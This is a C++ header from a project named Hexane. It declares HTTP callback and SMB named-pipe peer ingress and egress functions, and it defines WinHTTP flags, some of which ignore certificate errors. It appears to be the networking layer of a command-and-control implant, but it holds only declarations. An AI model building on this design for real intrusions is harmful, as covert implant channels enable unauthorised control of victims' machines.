#ifndef HEXANE_NETWORK_HPP
#define HEXANE_NETWORK_HPP

#define INTERNET_OPEN_TYPE_PROXY                        3
#define WINHTTP_FLAG_BYPASS_PROXY_CACHE     		0x00000100
#define WINHTTP_FLAG_REFRESH                		WINHTTP_FLAG_BYPASS_PROXY_CACHE
#define WINHTTP_FLAG_SECURE                 		0x00800000

#define WINHTTP_NO_REFERER                  	    	NULL
#define WINHTTP_NO_ADDITIONAL_HEADERS       		NULL
#define INTERNET_OPEN_TYPE_PRECONFIG			0
#define HTTP_QUERY_CONTENT_LENGTH			5
#define INTERNET_ERROR_BASE				12000
#define INTERNET_FLAG_RELOAD				0x80000000
#define INTERNET_FLAG_IGNORE_CERT_CN_INVALID		0x00001000
#define INTERNET_FLAG_IGNORE_CERT_DATE_INVALID		0x00002000
#define ERROR_HTTP_HEADER_NOT_FOUND			(INTERNET_ERROR_BASE + 150)

#include <core/include/monolith.hpp>
#include <core/include/cruntime.hpp>
#include <core/include/utils.hpp>

namespace Http {
    FUNCTION VOID HttpCallback(PSTREAM Outbound, PSTREAM *Inbound);
}

namespace Smb {
    FUNCTION BOOL PipeRead(PSTREAM Inbound, HANDLE Handle);
    FUNCTION BOOL PipeWrite(PSTREAM Outbound, HANDLE Handle);
    FUNCTION VOID PeerConnectIngress (PSTREAM Outbound, PSTREAM *Inbound);
    FUNCTION VOID PeerConnectEgress(PSTREAM Outbound, PSTREAM *Inbound);
    FUNCTION VOID SmbPipeReceive(PSTREAM Inbound, HANDLE Handle);
    FUNCTION VOID SmbContextInit(PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr);
    FUNCTION VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr);
}

#endif //HEXANE_NETWORK_HPP
